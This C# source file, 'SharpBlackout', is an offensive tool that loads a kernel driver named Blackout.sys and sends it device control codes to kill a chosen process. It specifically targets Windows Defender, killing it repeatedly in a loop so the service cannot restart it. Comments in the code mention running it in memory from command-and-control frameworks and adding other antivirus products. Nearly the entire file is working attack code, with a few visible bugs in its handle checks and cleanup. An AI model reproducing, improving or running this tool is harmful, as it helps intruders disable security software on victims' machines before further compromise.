using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Threading;

class Program
{
    const uint INITIALIZE_IOCTL_CODE = 0x9876C004;
    const uint TERMINSTE_PROCESS_IOCTL_CODE = 0x9876C094;

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool DeviceIoControl(IntPtr hDevice, uint dwIoControlCode, ref uint lpInBuffer, uint nInBufferSize, ref uint lpOutBuffer, uint nOutBufferSize, ref uint lpBytesReturned, IntPtr lpOverlapped);

    static void LoadDriver(string driverPath)
    {
        string serviceName = "SharpBlackout";
        using (ServiceController sc = new ServiceController(serviceName))
        {
            if (sc.Status == ServiceControllerStatus.Stopped)
            {
                sc.Start();
                Console.WriteLine("Starting service...");
            }
            else
            {
                Console.WriteLine("Service already running.");
            }
        }
    }

    static bool CheckProcess(uint processId)
    {
        Process[] processes = Process.GetProcesses();
        foreach (Process process in processes)
        {
            if (process.Id == processId)
            {
                return true;
            }
        }
        return false;
    }

    static uint GetPID(string processName)
    {
        Process[] processes = Process.GetProcessesByName(processName);
        if (processes.Length > 0)
        {
            return (uint)processes[0].Id;
        }
        return 0;
    }

    // Should work
    static void Main(string[] args)
    {
        if (args.Length != 2 || args[0] != "-p")
        {
            Console.WriteLine("Invalid arguments. Usage: SharpBlackout.exe -p <process_id>");
            return;
        }

        uint processId;
        if (!uint.TryParse(args[1], out processId))
        {
            Console.WriteLine("Invalid process ID provided.");
            return;
        }

        if (!CheckProcess(processId))
        {
            Console.WriteLine("Provided process ID does not exist!");
            return;
        }

        string driverPath = "Blackout.sys"; // Provide the path to the driver, test on how to make it all in mem for C2 Frameworks
        
        Console.WriteLine($"Loading {driverPath} driver...");

        LoadDriver(driverPath);

        IntPtr hDevice = CreateFile("\\\\.\\Blackout", 0xC0000000, 0, IntPtr.Zero, 3, 0, IntPtr.Zero);
        if (hDevice == IntPtr.Zero)
        {
            Console.WriteLine("Failed to open handle to driver!");
            return;
        }

        uint input = processId;
        uint output = 0;
        uint bytesReturned = 0;

        bool result = DeviceIoControl(hDevice, INITIALIZE_IOCTL_CODE, ref input, sizeof(uint), ref output, sizeof(uint), ref bytesReturned, IntPtr.Zero);

        if (!result)
        {
            Console.WriteLine($"Failed to send initializing request {INITIALIZE_IOCTL_CODE:X}!");
            return;
        }

        Console.WriteLine($"Driver initialized {INITIALIZE_IOCTL_CODE:X}!");

        // Look for Defender if any other AV's should make a list
        uint defenderPid = GetPID("MsMpEng.exe");
        if (defenderPid == input)
        {
            Console.WriteLine("Terminating Windows Defender...\nKeep the program running to prevent the service from restarting it.");

            while (true)
            {
                uint currentDefenderPid = GetPID("MsMpEng.exe");
                if (currentDefenderPid == input)
                {
                    result = DeviceIoControl(hDevice, TERMINSTE_PROCESS_IOCTL_CODE, ref input, sizeof(uint), ref output, sizeof(uint), ref bytesReturned, IntPtr.Zero);

                    if (!result)
                    {
                        Console.WriteLine($"DeviceIoControl failed. Error: {Marshal.GetLastWin32Error():X}");
                        break;
                    }

                    Console.WriteLine("Defender Terminated...");
                }

                Thread.Sleep(700);
            }
        }

        Console.WriteLine("Terminating process...");

        result = DeviceIoControl(hDevice, TERMINSTE_PROCESS_IOCTL_CODE, ref input, sizeof(uint), ref output, sizeof(uint), ref bytesReturned, IntPtr.Zero);

        if (!result)
        {
            Console.WriteLine($"Failed to terminate process: {Marshal.GetLastWin32Error():X}");
        }
        else
        {
            // Shoould be done here
            Console.WriteLine("Process has been terminated!");
        }

        // Keep the program running so Defender doesn't restart
        Console.ReadKey();

        Marshal.FreeHGlobal(hDevice);
    }
}
